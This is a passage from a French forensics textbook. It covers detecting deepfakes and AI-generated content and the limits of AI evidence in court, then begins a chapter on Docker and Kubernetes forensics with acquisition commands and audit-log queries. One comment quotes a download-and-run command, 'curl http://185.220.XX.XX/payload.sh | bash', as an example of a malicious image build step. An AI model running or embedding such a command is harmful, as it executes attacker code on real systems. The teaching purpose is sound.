# Etape 4 : analyse contextuelle (la plus fiable a ce jour)
# - Comparer avec des enregistrements authentiques connus
#   (discours publics du candidat, interviews)
# - Verifier la coherence factuelle du contenu attribue
# - Tracer l'origine de diffusion (premiere apparition,
#   compte source -- cf. Ch. 15, analyse reseau)
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{L'état de l'art~: course technologique sans fin}

La détection de deepfakes est un domaine de recherche en évolution
rapide et \textbf{aucun outil de détection actuel n'offre une
fiabilité absolue}. Chaque amélioration des détecteurs est suivie
d'une amélioration des générateurs (course aux armements
\textit{GAN vs détecteur}). Conséquence pour le rapport forensique~:
\begin{itemize}
    \item Ne jamais affirmer ``ce clip est un deepfake'' avec
          certitude absolue sur la seule base d'un détecteur
          automatisé~;
    \item Toujours croiser l'analyse technique avec l'analyse
          contextuelle (provenance, cohérence factuelle, témoignages)~;
    \item Documenter le taux de faux positifs/négatifs connu
          de l'outil utilisé à la date de l'analyse.
\end{itemize}
\end{boxalert}

\subsection{Détection d'images générées par IA}

\begin{boxoutils}{Indices forensiques d'images générées}
\begin{lstlisting}[language=bash_forensique]
# Indices visuels classiques (modeles de diffusion, 2023-2025) :
# - mains avec un nombre incorrect de doigts (de moins en moins
#   fiable : les modeles recents corrigent ce defaut)
# - incoherences dans les reflets, ombres, perspectives
# - texte illisible ou deforme dans l'image (panneaux, etiquettes)
# - metadonnees EXIF absentes ou incoherentes avec le contexte allegue

exiftool image_suspecte.jpg
# Rechercher specifiquement :
# - Software tag (certains generateurs laissent une signature,
#   ex : "Software: Midjourney" -- de moins en moins frequent
#   car facilement supprime)
# - Absence totale de donnees EXIF (suspect pour une photo
#   pretendue prise avec un smartphone)

# Detection par analyse de frequence (artefacts de generation)
# Outils specialises : 
# - Hugging Face model hub (modeles de detection open source)
# - C2PA (Coalition for Content Provenance and Authenticity)
#   -- standard emergent de signature de provenance des medias,
#   verifie via : c2patool inspect image.jpg

# IMPORTANT : l'absence d'indicateur de generation IA NE PROUVE
# PAS l'authenticite -- elle signifie seulement qu'aucun indicateur
# connu n'a ete detecte par les outils disponibles a la date
# de l'analyse
\end{lstlisting}
\end{boxoutils}

\subsection{Détection de texte généré par IA}

\begin{boxoutils}{Analyse de texte suspecté généré par LLM}
\begin{lstlisting}[language=bash_forensique]
# Contexte : un temoignage ecrit, un email, ou un document
# est suspecte d'avoir ete redige par un LLM plutot que par
# son auteur pretendu

# Indices linguistiques (faible fiabilite individuelle, a
# combiner) :
# - structures syntaxiques tres regulieres
# - absence de fautes typiques de l'auteur pretendu
#   (si l'auteur a un niveau de francais connu, par exemple)
# - vocabulaire incoherent avec le profil socio-educatif declare
# - "perplexite" textuelle anormalement basse (mesure statistique
#   de la previsibilite du texte selon un modele de langage)

# Outils de detection (fiabilite limitee et contestee
# scientifiquement -- a utiliser avec EXTREME prudence en
# contexte judiciaire) :
# - GPTZero, Originality.ai, etc.
# ATTENTION : ces outils ont des taux de faux positifs
# significatifs, particulierement sur les textes d'auteurs
# non-natifs du francais/anglais -- RISQUE DE BIAIS DISCRIMINATOIRE
# a documenter explicitement si ces outils sont utilises

# Approche forensique privilegiee : analyse de la chaine de
# production du document (metadonnees du fichier, historique
# de versions, horodatage de creation vs publication) plutot
# que l'analyse stylometrique seule
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Limites Épistémologiques de l'IA en Contexte Judiciaire}
\label{sec:limites-ia}
% ============================================================================

\subsection{Le problème de l'explicabilité}

\begin{boxdef}
\textbf{Explicabilité (XAI)}\index{explicabilité}~: capacité d'un
système d'IA à justifier sa décision dans des termes compréhensibles
par un humain. Les modèles de \textit{deep learning} complexes
(réseaux de neurones profonds) sont notoirement peu explicables
--- ils produisent un résultat sans qu'on puisse facilement tracer
le raisonnement qui y a mené.
\end{boxdef}

\begin{boxjuris}
\textbf{L'explicabilité et le standard FRE~Rule~702 / témoignage expert}

Le Chapitre~\ref{chap:leg-mond} a présenté les \textit{Federal Rules
of Evidence}. La Rule~702 (méthodologie de l'expert) exige que les
méthodes employées soient \textbf{fiables et vérifiables}. Un modèle
d'IA ``boîte noire'' dont même son concepteur ne peut expliquer le
raisonnement pose un problème direct~: comment l'expert peut-il
attester de la fiabilité d'une méthode qu'il ne peut pas expliquer~?

\textbf{Conséquence pratique~:} privilégier, chaque fois que possible,
des méthodes explicables (classification par règles, scores pondérés
documentés) pour les conclusions qui seront présentées au tribunal.
Réserver les modèles complexes (deep learning) au triage préliminaire,
suivi systématique d'une validation humaine explicable.
\end{boxjuris}

\subsection{Biais algorithmique et discrimination}

\begin{boxalert}
\textbf{Le risque de biais dans les outils forensiques IA}

Les modèles d'IA héritent des biais présents dans leurs données
d'entraînement. En contexte forensique, ce risque est documenté
pour~:
\begin{itemize}
    \item \textbf{Reconnaissance faciale}~: taux d'erreur
          significativement plus élevés pour certaines catégories
          démographiques selon de nombreuses études indépendantes
          (NIST, MIT Media Lab)~;
    \item \textbf{Détection de texte généré par IA}~: biais
          documentés contre les locuteurs non-natifs de la
          langue d'analyse~;
    \item \textbf{Reconnaissance vocale}~: performance variable
          selon les accents régionaux.
\end{itemize}
\textbf{Implication pour le Cameroun~:} les outils d'IA forensique
sont majoritairement entraînés sur des corpus occidentaux.
Leur application à des sujets, des voix ou des textes camerounais
(accents locaux, mélange français/anglais/langues locales)
\textbf{peut présenter des taux d'erreur non documentés}.
Exiger systématiquement, avant utilisation en contexte judiciaire,
une évaluation indépendante du taux d'erreur de l'outil sur des
échantillons représentatifs de la population concernée.
\end{boxalert}

\subsection{Robustesse au contre-interrogatoire}

\begin{boxscenario}{Contre-interrogatoire d'une conclusion assistée par IA}
\textbf{Contexte~:} dans l'affaire MUNGO, l'expert a utilisé un outil
de détection de deepfake (taux de détection annoncé par l'éditeur~:
94\%) pour conclure que 8~des~12~clips audio sont des deepfakes.

\textbf{Q~:} ``Quel est le taux de faux positifs de cet outil~?''\\
\textbf{R~:} ``L'éditeur annonce un taux de faux positifs de~3\%
sur son jeu de test publié. Je n'ai pas de donnée indépendante
sur la performance spécifique pour des voix en français camerounais.
J'ai en conséquence croisé cette analyse avec une comparaison
contextuelle [détails de l'analyse contextuelle].''

\textbf{Q~:} ``Pouvez-vous expliquer pourquoi l'algorithme a classé
ce clip spécifique comme deepfake~?''\\
\textbf{R~:} ``L'outil utilisé fournit un score de confiance global
(87\% dans ce cas) mais ne détaille pas les caractéristiques
spécifiques ayant motivé ce score, ce qui constitue une limite que
je documente dans mon rapport. Pour cette raison, ma conclusion
ne repose pas uniquement sur ce score mais sur la convergence avec
[analyse spectrale manuelle, incohérences contextuelles].''

\textbf{Constat~:} la deuxième réponse illustre la bonne pratique~:
l'expert reconnaît la limite de l'outil ET montre que sa conclusion
ne dépend pas uniquement de cette boîte noire.
\end{boxscenario}

% ============================================================================
\section{Documenter une Analyse Assistée par IA dans le Rapport}
\label{sec:documentation-ia}
% ============================================================================

\begin{lstlisting}[language=bash_forensique,
    caption={Modèle de documentation d'une analyse assistée par IA}]
3.X MÉTHODOLOGIE -- OUTIL DE DÉTECTION ASSISTÉE PAR IA

Outil utilisé        : [Nom, version, éditeur]
Date d'utilisation    : [date]
Type de modèle        : [ex : réseau de neurones convolutif
                          entraîné pour la détection de deepfakes
                          audio]
Performance annoncée  : [taux de détection / faux positifs selon
                          la documentation de l'éditeur, avec
                          référence à la publication ou au rapport
                          technique correspondant]
Validation indépendante : [Oui/Non -- si Non, le mentionner
                          explicitement comme une limite]
Limite identifiée      : [absence de données de performance
                          spécifiques au contexte linguistique/
                          démographique camerounais, le cas échéant]

CONSTATATION (résultat brut de l'outil) :
"L'outil [nom] a attribué un score de confiance de 87% à
l'hypothèse que le clip audio [référence] est généré par
synthèse vocale."
[Ceci EST une constatation : c'est un fait vérifiable -- l'outil
a produit ce score. Ce N'EST PAS une preuve que le clip est
effectivement un deepfake.]

ANALYSE (interprétation avec niveau de confiance) :
"Ce résultat, combiné avec [analyse spectrale manuelle révélant
X, absence de métadonnées d'enregistrement original, incohérence
contextuelle Y], converge vers la conclusion que ce clip audio
est très probablement un contenu synthétique, avec un niveau
de confiance modéré à élevé. Cette conclusion ne repose pas
exclusivement sur le score de l'outil automatisé."
\end{lstlisting}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Deux visages de l'IA}~: outil (triage, détection
          d'anomalies, accélération) et objet (deepfakes, contenus
          synthétiques à authentifier). Compétences différentes,
          rigueur identique.

    \item \textbf{Règle d'or du triage}~: l'IA \textbf{priorise},
          elle ne \textbf{décide jamais} de l'exclusion définitive
          d'un document. Tout document doit rester accessible
          et son score documenté.

    \item \textbf{Détection de deepfakes}~: croiser systématiquement
          analyse technique (métadonnées, spectrogramme, outils
          spécialisés) et analyse contextuelle (provenance,
          cohérence factuelle). Aucun outil n'offre une fiabilité
          absolue~--- course technologique permanente.

    \item \textbf{Explicabilité}~: privilégier les méthodes
          explicables pour les conclusions présentées au tribunal.
          Les modèles ``boîte noire'' posent un problème direct
          au regard du standard FRE~Rule~702.

    \item \textbf{Biais algorithmique~:} les outils d'IA forensique
          sont majoritairement entraînés sur des corpus occidentaux.
          Exiger une évaluation indépendante de leur performance
          sur des échantillons représentatifs avant usage judiciaire
          au Cameroun.

    \item \textbf{Documentation}~: le résultat brut d'un outil IA
          est une \textbf{constatation} (``l'outil a produit ce
          score'')~; son interprétation est une \textbf{analyse}
          (avec niveau de confiance et hypothèses alternatives).
          Ne jamais présenter un score automatisé comme une
          conclusion en soi.

    \item \textbf{Contre-interrogatoire}~: anticiper systématiquement
          les questions sur le taux de faux positifs, l'explicabilité
          et la validation indépendante de tout outil d'IA utilisé.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~22.1 --- Triage vs décision \niveaubase}]
Pour chacune des situations suivantes, déterminez si l'usage de
l'IA décrit respecte la règle ``l'IA priorise, ne décide jamais''~:
\begin{enumerate}[(a)]
    \item Un outil de classification trie 50~000~emails par score
          de pertinence~; l'investigateur examine les 500~premiers
          puis conclut son rapport sans mentionner les~49~500~autres.
    \item Un outil UEBA signale 12~connexions comme anormales sur
          5~000~; l'investigateur documente les 12~connexions
          \emph{et} précise dans son rapport les critères et
          paramètres du modèle utilisé.
    \item Un détecteur de deepfake conclut ``deepfake~: 91\%
          de confiance''~; le rapport cite uniquement ce score
          comme preuve de falsification.
\end{enumerate}
Pour chaque cas, identifiez le risque CRO associé.
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~22.2 --- Analyse de deepfake \niveaumoyen}]
Vous recevez un clip audio de 45~secondes dans lequel une voix
ressemblant à celle du Directeur Financier d'une entreprise
camerounaise autorise un virement de 80~millions~FCFA par téléphone.
\begin{enumerate}[(a)]
    \item Listez les 4~étapes d'analyse forensique que vous
          appliqueriez (référez-vous à la structure de ce chapitre).
    \item Quelles métadonnées chercheriez-vous en premier~? Que
          signifierait leur absence totale~?
    \item Si l'outil de détection automatisé donne un score
          ambigu (52\% de confiance ``deepfake''), quelle est votre
          démarche~? Quelles autres sources mobilisez-vous
          (pensez aux Ch.~15~et~17)~?
    \item Rédigez la section ``Constatation'' et ``Analyse''
          correspondant à votre conclusion, en respectant
          la structure du Ch.~\ref{chap:rapport}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~22.3 --- IA et biais en contexte camerounais \niveauexpert}]
L'ANTIC envisage de déployer un outil commercial de reconnaissance
vocale pour automatiser le traitement des plaintes orales déposées
par téléphone, en complément du travail des OPJ.
\begin{enumerate}[(a)]
    \item Quelles questions poseriez-vous à l'éditeur de l'outil
          avant son déploiement, en lien avec les biais algorithmiques
          présentés dans ce chapitre~?
    \item Le Cameroun est un pays multilingue (français, anglais,
          plus de 250~langues locales, avec des accents régionaux
          marqués). Quel risque spécifique cela pose-t-il pour
          un outil entraîné sur des corpus majoritairement
          occidentaux~?
    \item Si cet outil devait être utilisé pour trier les plaintes
          par ordre de priorité, quelles garanties proposeriez-vous
          pour respecter le principe ``l'IA priorise, ne décide
          jamais''~?
    \item Rédigez une recommandation de politique d'usage (5~points
          maximum) pour l'adoption responsable de cet outil par
          l'ANTIC, en vous appuyant sur les principes
          d'explicabilité et de validation indépendante.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} L'intelligence artificielle transforme à la
fois les capacités de l'investigateur et la nature des preuves
à analyser. Cette double transformation se prolonge dans le défi
suivant~: l'arrivée de l'informatique quantique, qui menace
à terme l'intégrité cryptographique des preuves numériques
signées aujourd'hui. C'est l'objet du chapitre suivant.
\end{boxinfo}
      
        % ============================================================================
% Fichier  : partie5/P05_C23_containers_cloud_native.tex
% Titre    : Forensique Cloud-Native et Conteneurs
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Construit ex-nihilo (aucune source projet ne couvre les
%            conteneurs). Prolonge directement Ch.17 (forensique cloud
%            IaaS) au niveau de la couche orchestration/conteneurs.
% Positionnement : Troisième chapitre de la Partie V. Le Ch.17 a traité
%                  le cloud au niveau VM/IaaS (CloudTrail, snapshots EBS).
%                  Ce chapitre descend d'un niveau d'abstraction : que se
%                  passe-t-il quand l'unité de calcul n'est plus une VM
%                  mais un conteneur vivant quelques secondes ou minutes ?
% ============================================================================

\chapter{Forensique Cloud-Native et Conteneurs}
\label{chap:containers}

\epigraph{%
    « Un conteneur compromis peut avoir disparu avant même que vous
    ayez fini de lire l'alerte qui vous en informe. »%
}{--- Réalité opérationnelle du cloud-native}

\niveauChapitre{Expert}{%
    Notions de Docker et Kubernetes requises. Chapitre~\ref{chap:for-cloud}
    (forensique cloud IaaS) indispensable~: ce chapitre descend d'un
    niveau d'abstraction supplémentaire.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre l'architecture conteneurs~/~orchestrateur et
          identifier où résident les données forensiques à chaque couche.
    \item Acquérir l'état d'un conteneur Docker compromis avant
          sa destruction~: système de fichiers, processus, réseau.
    \item Analyser les journaux et événements Kubernetes pour
          reconstituer une chronologie d'attaque cloud-native.
    \item Gérer l'éphéméralité extrême des conteneurs~: stratégies
          de capture en environnement de production.
    \item Identifier les vecteurs d'attaque spécifiques aux
          conteneurs~: évasion, images compromises, secrets exposés.
    \item Documenter une investigation cloud-native dans le respect
          des principes de custody adaptés à cet environnement.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi un chapitre dédié aux conteneurs}
% ============================================================================

Le Chapitre~\ref{chap:for-cloud} a traité la forensique cloud au niveau
de la machine virtuelle~: CloudTrail enregistre qui a lancé une instance
EC2, un snapshot EBS préserve son disque. Mais l'architecture moderne
des applications cloud ne s'arrête pas aux VMs~: à l'intérieur de
chaque VM tournent désormais des dizaines, parfois des centaines de
\textbf{conteneurs} --- des unités d'exécution légères, créées et
détruites en quelques secondes, orchestrées par des systèmes comme
\termecle{Kubernetes}\index{Kubernetes}.

Cette architecture pousse l'éphéméralité (déjà identifiée au
Ch.~\ref{chap:for-cloud} comme défi central du cloud) à son extrême~:
un conteneur compromis peut être détruit par l'orchestrateur lui-même
--- pour cause de redémarrage automatique, de mise à l'échelle, ou
de politique de sécurité --- avant que l'investigateur n'ait eu le
temps d'intervenir.

\separateur

% ============================================================================
\section{Architecture Conteneurs~: où Résident les Données}
\label{sec:architecture-conteneurs}
% ============================================================================

\subsection{Les couches d'abstraction}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Couche} &
    \tableauHeader{Durée de vie typique} &
    \tableauHeader{Données forensiques}
}
\textbf{Image} (Docker Image) & Persistante (registre) &
    Code applicatif, dépendances, configuration~; analysable
    hors-ligne comme un firmware (Ch.~\ref{chap:for-iot}) \\
\textbf{Conteneur} (instance d'exécution) & Secondes à jours &
    Processus actifs, système de fichiers en écriture
    (\textit{layer} superposé), variables d'environnement \\
\textbf{Pod} (Kubernetes~: groupe de conteneurs) & Minutes à mois &
    Logs agrégés, réseau interne au Pod, volumes partagés \\
\textbf{N\oe ud} (machine hébergeant les Pods) & Heures à années &
    Logs systemd/journald (Ch.~\ref{chap:for-sys}), logs kubelet,
    images Docker en cache \\
\textbf{Cluster} (orchestrateur complet) & Persistant &
    \texttt{etcd} (base de données d'état)~; audit logs API
    Kubernetes~; configuration RBAC \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.1 --- Couches d'abstraction et données forensiques}\end{center}

\subsection{Le défi de l'éphéméralité extrême}

\begin{boxCRO}
\textbf{Analyse CRO --- Éphéméralité des conteneurs}

$\mathcal{R}$ (Fiabilité)~: capturer l'état exact d'un conteneur
en cours d'exécution avant sa destruction nécessite une réaction
en quelques secondes à minutes. Un conteneur Kubernetes peut être
détruit automatiquement par une politique de \textit{liveness probe}
(redémarrage si le processus principal échoue) sans intervention
humaine.

$\mathcal{O}$ (Opposabilité)~: l'absence de preuve directe (le
conteneur a disparu) ne signifie pas l'absence d'incident~--- mais
elle complique significativement la démonstration. Les logs
externalisés (Section~\ref{sec:logs-k8s}) deviennent la source
probatoire principale.

$\mathcal{C}$ (Confidentialité)~: un cluster Kubernetes multi-tenant
héberge souvent les charges de travail de plusieurs clients sur
la même infrastructure physique~--- l'investigation d'un Pod doit
être rigoureusement cantonnée à son périmètre (\textit{namespace}).

\cro{$\downarrow$ cantonnement namespace}{$\downarrow\downarrow$ disparition rapide}{$\sim$ dépend des logs externalisés}

\textbf{Conséquence opérationnelle~:} contrairement aux Ch.~14--18
où l'acquisition pouvait souvent attendre quelques heures, la
forensique conteneur exige une \textbf{architecture de détection
et réponse automatisée} (Section~\ref{sec:strategie-capture})
mise en place \emph{avant} l'incident.
\end{boxCRO}

% ============================================================================
\section{Acquisition d'un Conteneur Docker Compromis}
\label{sec:acquisition-docker}
% ============================================================================

\subsection{Capture de l'état d'un conteneur en cours d'exécution}

\begin{boxoutils}{Acquisition forensique d'un conteneur Docker actif}
\begin{lstlisting}[language=bash_forensique]
# PRINCIPE : agir vite, dans l'ordre de volatilite (RFC 3227
# adapte aux conteneurs, cf. Ch. 21 pour la logique generale)

# Etape 1 : identifier le conteneur suspect
docker ps
# CONTAINER ID   IMAGE          STATUS         NAMES
# a3f7b29c8e1d   webapp:latest  Up 47 minutes  prod-webapp-3

# Etape 2 : capturer les processus actifs DANS le conteneur
docker top a3f7b29c8e1d -eo pid,ppid,cmd,etime
# Revele les processus en cours -- equivalent du Volatility
# pslist (Ch. 14) mais a l'echelle du conteneur

# Etape 3 : capturer les connexions reseau du conteneur
docker exec a3f7b29c8e1d cat /proc/net/tcp
# Ou, depuis l'hote (sans modifier le conteneur) :
nsenter -t $(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d) \
    -n netstat -tupln

# Etape 4 : capturer les logs du conteneur (stdout/stderr)
docker logs a3f7b29c8e1d --timestamps > /output/container_logs.txt

# Etape 5 : capturer le diff du systeme de fichiers
# (ce qui a ete modifie par rapport a l'image d'origine)
docker diff a3f7b29c8e1d > /output/container_fs_diff.txt
# Resultat type :
# A /tmp/malware.sh        <- fichier Ajoute
# C /etc/passwd            <- fichier Change
# D /var/log/auth.log      <- fichier Detruit (anti-forensique !)

# Etape 6 : exporter le systeme de fichiers complet du conteneur
docker export a3f7b29c8e1d -o /output/container_export.tar
sha256sum /output/container_export.tar > /output/container_hash.txt

# Etape 7 : capturer l'image source pour comparaison
docker save webapp:latest -o /output/image_source.tar
# Comparer image_source (etat propre) avec container_export
# (etat compromis) pour isoler precisement les modifications

# Etape 8 : SEULEMENT APRES capture complete -- arreter le conteneur
# (preserve l'etat pour investigation differee si necessaire)
docker pause a3f7b29c8e1d   # gele sans detruire
# docker stop -- a eviter en premier reflexe : declenche parfois
# des hooks de nettoyage (anti-forensique involontaire)
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{\texttt{docker diff}~: l'outil le plus sous-utilisé en
forensique conteneur}

La commande \texttt{docker diff} révèle en une seconde tous les
fichiers ajoutés, modifiés ou supprimés par rapport à l'image
d'origine immuable. C'est l'équivalent conteneur du \texttt{\$UsnJrnl}
(Ch.~\ref{chap:for-sys})~: elle révèle non seulement l'activité
malveillante mais aussi les \textbf{tentatives de suppression
de logs internes} au conteneur (marquées \texttt{D} dans la sortie).
Toujours exécuter cette commande \textbf{avant} tout arrêt du conteneur.
\end{boxalert}

\subsection{Capture mémoire d'un conteneur}

\begin{boxoutils}{Capture mémoire d'un processus conteneurisé}
\begin{lstlisting}[language=bash_forensique]
# Un conteneur partage le noyau de l'hote -- pas d'hyperviseur
# separe comme pour une VM. La capture memoire cible le ou les
# processus du conteneur depuis l'hote.

# Identifier le PID hote correspondant au conteneur
CONTAINER_PID=$(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d)
echo $CONTAINER_PID
# 48291

# Capturer la memoire du processus (sur l'hote, avec privileges)
gcore -o /output/container_memory $CONTAINER_PID
# Genere /output/container_memory.48291

# Analyse avec Volatility 3 (meme outil que Ch. 14, profil Linux)
python3 vol.py -f /output/container_memory.48291 \
    linux.bash    # historique bash si shell actif dans le conteneur
python3 vol.py -f /output/container_memory.48291 \
    linux.pslist  # processus enfants du processus principal

# Alternative : capture de la memoire complete de l'hote
# (capture TOUS les conteneurs, plus lourd mais plus complet)
# -- utiliser LiME (Linux Memory Extractor) comme au Ch. 14
# pour les systemes Linux
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Logs et Événements Kubernetes}
\label{sec:logs-k8s}
% ============================================================================

\subsection{Architecture de logging Kubernetes}

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Source} &
    \tableauHeader{Contenu} &
    \tableauHeader{Rétention typique}
}
\textbf{API Server Audit Log} & Chaque appel à l'API Kubernetes~:
    qui, quoi, quand &
    Selon configuration (souvent~7--30~jours)~; \textbf{le plus
    important pour la forensique} \\
\textbf{Kubelet logs} & Activité du nœud~: démarrage/arrêt de Pods &
    Logs systemd locaux (Ch.~\ref{chap:for-sys})~; rotation rapide \\
\textbf{Pod logs} & \texttt{stdout}/\texttt{stderr} de l'application &
    Perdus à la suppression du Pod sauf agrégation externe
    (ELK, Loki) \\
\textbf{etcd} & État complet du cluster (configuration, secrets) &
    Persistant tant que le cluster existe~; snapshot recommandé \\
\textbf{Events} (\texttt{kubectl get events}) & Événements du cycle
    de vie (création, échec, redémarrage) &
    \textbf{1~heure par défaut} --- extrêmement volatile \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.2 --- Sources de logs Kubernetes}\end{center}

\begin{boxoutils}{Extraction de l'audit log Kubernetes API Server}
\begin{lstlisting}[language=bash_forensique]
# Format de l'Audit Log Kubernetes (JSON Lines)
# Localisation typique : /var/log/kubernetes/audit.log
# (ou exporte vers un SIEM -- cf. principe de forwarding, Ch. 21)

# Filtrer les actions sur un namespace specifique
cat audit.log | jq 'select(.objectRef.namespace == "production")'

# Identifier qui a cree/modifie/supprime des ressources
cat audit.log | jq -r 'select(.verb == "create" or .verb ==
    "delete") | [.requestReceivedTimestamp, .verb,
    .objectRef.resource, .objectRef.name,
    .user.username, .sourceIPs[0]] | @csv'

# Detecter l'execution de commandes dans un Pod (kubectl exec)
# -- vecteur d'attaque frequent une fois un acces initial obtenu
cat audit.log | jq 'select(.objectRef.subresource == "exec")'
# Resultat type :
# {
#   "verb": "create",
#   "objectRef": {"resource": "pods", "name": "prod-webapp-3",
#                  "subresource": "exec"},
#   "user": {"username": "system:serviceaccount:default:ci-cd"},
#   "requestReceivedTimestamp": "2026-03-13T02:17:30Z"
# }
# -- un compte de service CI/CD executant un kubectl exec
#    en pleine nuit est hautement suspect

# Detecter la creation de Pods avec privileges eleves
# (vecteur d'evasion de conteneur frequent)
cat audit.log | jq 'select(.verb == "create" and
    .objectRef.resource == "pods") |
    select(.requestObject.spec.containers[].securityContext.privileged
    == true)'
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Reconstitution d'une attaque Kubernetes --- cas MVOM étendu}
Extension de l'affaire MVOM (Ch.~\ref{chap:for-cloud})~: TRANSBOIS~SA
utilisait en réalité un cluster Kubernetes pour héberger ses applications.
L'audit log API Server révèle~:

\begin{lstlisting}[language=bash_forensique]
02:14:09  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
          IP:185.220.XX.XX
02:14:15  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
          subresource:exec  command:["/bin/sh"]
02:16:50  UPDATE  pods/prod-webapp-3  user:ci-cd-sa
          (modification de fichiers via exec, pas de trace
           directe dans audit log -- voir docker diff)
02:19:45  DELETE  pods/prod-webapp-3  user:system:kube-scheduler
          reason:Evicted (le pod a ete automatiquement detruit
          par l'orchestrateur suite a une alerte ressources)
\end{lstlisting}

\textbf{Constatation~:} l'audit log API Server enregistre une
création de session \texttt{exec} sur le Pod \texttt{prod-webapp-3}
à 02h14:15, initiée par le compte de service \texttt{ci-cd-sa}
depuis l'IP \texttt{185.220.XX.XX}.\\[0.3ex]
\textbf{Analyse~:} la destruction automatique du Pod à 02h19:45
(raison~: \texttt{Evicted}, déclenchée par l'orchestrateur
lui-même et non par l'attaquant) illustre la fragilité probatoire
spécifique aux environnements cloud-native~: \textbf{le système
a lui-même détruit la preuve principale} (le conteneur compromis)
dans le cadre de son fonctionnement normal, 5~minutes et~30~secondes
après l'intrusion. Seul l'audit log API Server, externalisé
vers un SIEM distinct du cluster, a permis de reconstituer
cette chronologie.
\end{boxscenario}

% ============================================================================
\section{Vecteurs d'Attaque Spécifiques aux Conteneurs}
\label{sec:vecteurs-attaque}
% ============================================================================

\subsection{Images compromises}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Vecteur} &
    \tableauHeader{Mécanisme} &
    \tableauHeader{Trace forensique}
}
\textbf{Image malveillante} & Image publique sur Docker~Hub
    contenant un payload caché &
    Hash de l'image~; comparaison avec le registre officiel~;
    \texttt{docker history} pour voir les couches \\
\textbf{Dépendance compromise} & Bibliothèque tierce incluse
    dans l'image (\textit{supply chain attack}) &
    Analyse du \texttt{Dockerfile}~/ \texttt{requirements.txt}~;
    scan de vulnérabilités (Trivy, Grype) \\
\textbf{Secrets exposés} & Clés API, mots de passe codés en dur
    dans l'image &
    \texttt{docker history --no-trunc}~; scan avec
    \texttt{trufflehog} ou \texttt{gitleaks} \\
\textbf{Évasion de conteneur} & Exploitation d'une vulnérabilité
    pour sortir du conteneur vers l'hôte &
    Logs kernel (\texttt{dmesg})~; alertes runtime
    (Falco)~; processus inattendus sur l'hôte \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.3 --- Vecteurs d'attaque conteneurs et traces forensiques}\end{center}

\begin{boxoutils}{Analyse forensique d'une image Docker suspecte}
\begin{lstlisting}[language=bash_forensique]
# Examiner l'historique des couches de l'image (sans l'executer)
docker history --no-trunc webapp:latest
# Revele chaque commande RUN/COPY/ADD ayant construit l'image
# -- une commande "RUN curl http://185.220.XX.XX/payload.sh |
#    bash" serait visible ici

# Extraire et analyser le contenu de l'image (comme un firmware,
# cf. Ch. 18 -- meme logique avec Binwalk)
docker save webapp:latest -o image.tar
tar -xf image.tar -C /output/image_extracted/
# Chaque couche est un fichier layer.tar -- extraire et analyser

# Scanner les vulnerabilites connues (CVE)
trivy image webapp:latest
# Resultat type :
# webapp:latest (alpine 3.18)
# Total: 14 (HIGH: 3, CRITICAL: 1)
# CVE-2024-XXXX  openssl  CRITICAL  Remote Code Execution

# Rechercher des secrets codes en dur
trufflehog docker --image webapp:latest
# Detecte : cles AWS, tokens API, mots de passe en clair dans
# les couches de l'image (meme si supprimes dans une couche
# ulterieure -- ils restent dans l'historique des couches !)

# Comparer le hash de l'image avec le registre officiel
docker inspect webapp:latest --format='{{.Id}}'
# Comparer avec le digest publie sur Docker Hub / registre prive
# Une divergence indique une image modifiee localement
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Les secrets supprimés restent dans l'historique des couches}
Une erreur fréquente des développeurs~: ajouter un secret (clé API)
dans une couche Docker, puis le supprimer dans une couche ultérieure
en pensant l'avoir effacé. \textbf{Le secret reste accessible} dans
l'historique des couches de l'image, car Docker conserve chaque
couche indépendamment. C'est un parallèle direct avec le wiping
de fichiers (Ch.~\ref{chap:anti-for})~: la suppression apparente
ne supprime pas la donnée sous-jacente. Cette caractéristique est
à la fois une faille de sécurité courante \emph{et} une opportunité
forensique pour l'investigateur.
\end{boiteRemarque}

% ============================================================================
\section{Stratégie de Capture en Production}
\label{sec:strategie-capture}
% ============================================================================

\subsection{Pourquoi l'acquisition réactive est insuffisante}

Contrairement aux scénarios des Chapitres~\ref{chap:for-sys}
à~\ref{chap:for-iot} où l'investigateur arrive après l'incident avec
le temps de mettre en place une acquisition méthodique, l'éphéméralité
extrême des conteneurs exige une \textbf{architecture préventive}.

\begin{boxPNC}
\textbf{Recommandations architecturales pour la \textit{readiness}
forensique cloud-native}

\begin{enumerate}
    \item \textbf{Externalisation systématique des logs}~: agrégation
          en temps réel (Fluentd, Loki) vers un système distinct
          du cluster, avec rétention minimale de~90~jours.
    \item \textbf{Audit log API Server activé et exporté}~:
          configuration \texttt{Metadata} ou \texttt{RequestResponse}
          (niveau de détail) selon la criticité~; export immédiat
          hors du cluster.
    \item \textbf{Politique d'\textit{eviction} documentée}~: en cas
          d'incident suspecté, désactiver temporairement
          l'\textit{auto-scaling} et les redémarrages automatiques
          pour préserver l'état du conteneur compromis.
    \item \textbf{Runtime security monitoring}~: outils comme
